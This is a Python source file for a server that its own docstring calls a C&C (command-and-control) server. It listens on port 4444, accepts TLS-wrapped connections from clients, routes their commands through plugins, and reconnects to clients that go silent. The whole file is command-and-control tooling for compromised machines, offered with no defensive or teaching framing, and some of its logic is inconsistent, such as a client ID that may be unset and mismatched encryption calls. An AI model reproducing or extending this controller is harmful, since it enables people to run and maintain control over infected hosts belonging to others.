import socket
import threading
import json
import ssl
import logging
from datetime import datetime
from core.plugin_system import PluginManager
from core.multiple_servers import LoadBalancer
from utils.advanced_crypto import CryptoManager
from utils.logger import Logger
from utils.integrity import IntegrityChecker
from utils.security_manager import SecurityManager

class Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.running = False
        self.clients = {}
        self.lock = threading.Lock()
        
        # Khởi tạo các components
        self.logger = Logger()
        self.plugin_manager = PluginManager()
        self.load_balancer = LoadBalancer()
        self.crypto_manager = CryptoManager()
        self.integrity_checker = IntegrityChecker()
        self.security_manager = SecurityManager()
        
        # SSL/TLS Configuration
        self.ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        self.ssl_context.load_cert_chain('certs/server.crt', 'certs/server.key')
        
        # Plugin system
        self.load_plugins()
        
    def load_plugins(self):
        """Load all available plugins"""
        self.plugin_manager.load_directory('plugins')
        self.logger.info(f"Loaded {len(self.plugin_manager.plugins)} plugins")
        
    def start(self):
        """Start the C&C server"""
        try:
            self.running = True
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(100)
            
            # Wrap with SSL
            self.server_socket = self.ssl_context.wrap_socket(self.server_socket, server_side=True)
            
            # Start load balancer
            self.load_balancer.start()
            
            # Start recovery monitor
            threading.Thread(target=self.recovery_monitor, daemon=True).start()
            
            self.logger.info(f"Server running on {self.host}:{self.port}")
            
            while self.running:
                client_socket, address = self.server_socket.accept()
                threading.Thread(target=self.handle_client, args=(client_socket, address)).start()
                
        except Exception as e:
            self.logger.error(f"Server error: {str(e)}")
            self.stop()
            
    def stop(self):
        """Stop the server"""
        self.running = False
        self.server_socket.close()
        self.load_balancer.stop()
        
    def handle_client(self, client_socket, address):
        """Handle a client connection"""
        try:
            # Verify client certificate
            cert = client_socket.getpeercert()
            if not self.security_manager.verify_cert(cert):
                raise Exception("Invalid certificate")
                
            # Setup encryption
            session_key = self.crypto_manager.generate_session_key()
            client_socket.send(self.crypto_manager.encrypt_key(session_key))
            
            client_id = self.register_client(client_socket, address)
            self.logger.info(f"New client connected: {address[0]} (ID: {client_id})")
            
            while self.running:
                # Receive encrypted data
                encrypted_data = client_socket.recv(4096)
                if not encrypted_data:
                    break
                    
                # Decrypt and verify
                data = self.crypto_manager.decrypt(encrypted_data, session_key)
                if not self.integrity_checker.verify_message(data):
                    raise Exception("Message integrity check failed")
                    
                # Process command
                self.process_client_data(client_id, data)
                
        except Exception as e:
            self.logger.error(f"Client error: {str(e)}")
        finally:
            self.unregister_client(client_id)
            client_socket.close()
            
    def register_client(self, socket, address):
        """Register a new client"""
        with self.lock:
            client_id = self.security_manager.generate_client_id()
            self.clients[client_id] = {
                'socket': socket,
                'address': address,
                'connected_at': datetime.now(),
                'last_seen': datetime.now(),
                'status': 'active'
            }
            return client_id
            
    def unregister_client(self, client_id):
        """Unregister a client"""
        with self.lock:
            if client_id in self.clients:
                self.clients[client_id]['status'] = 'disconnected'
                self.logger.info(f"Client disconnected: {client_id}")
                
    def process_client_data(self, client_id, data):
        """Process data received from client"""
        try:
            message = json.loads(data)
            command = message.get('command')
            
            # Route to appropriate plugin
            if command in self.plugin_manager.commands:
                response = self.plugin_manager.execute(command, message.get('data'))
            else:
                response = {'status': 'error', 'message': 'Unknown command'}
                
            # Send encrypted response
            client = self.clients.get(client_id)
            if client and client['status'] == 'active':
                encrypted_response = self.crypto_manager.encrypt(json.dumps(response))
                client['socket'].send(encrypted_response)
                
        except Exception as e:
            self.logger.error(f"Error processing client data: {str(e)}")
            
    def recovery_monitor(self):
        """Monitor and recover lost connections"""
        while self.running:
            try:
                current_time = datetime.now()
                with self.lock:
                    for client_id, client in self.clients.items():
                        if (current_time - client['last_seen']).seconds > 300:  # 5 minutes
                            if client['status'] == 'active':
                                self.logger.warning(f"Client {client_id} not responding")
                                self.trigger_recovery(client_id)
            except Exception as e:
                self.logger.error(f"Recovery monitor error: {str(e)}")
            finally:
                threading.Event().wait(60)  # Check every minute
                
    def trigger_recovery(self, client_id):
        """Trigger recovery mechanism for lost client"""
        try:
            client = self.clients.get(client_id)
            if client:
                # Attempt to reconnect
                recovery_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                recovery_socket.settimeout(10)
                recovery_socket.connect(client['address'])
                
                # Update client record
                with self.lock:
                    self.clients[client_id]['socket'] = recovery_socket
                    self.clients[client_id]['last_seen'] = datetime.now()
                    self.clients[client_id]['status'] = 'recovered'
                    
                self.logger.info(f"Successfully recovered client {client_id}")
                
        except Exception as e:
            self.logger.error(f"Recovery failed for client {client_id}: {str(e)}")
            self.unregister_client(client_id)

if __name__ == '__main__':
    server = Server()
    server.start()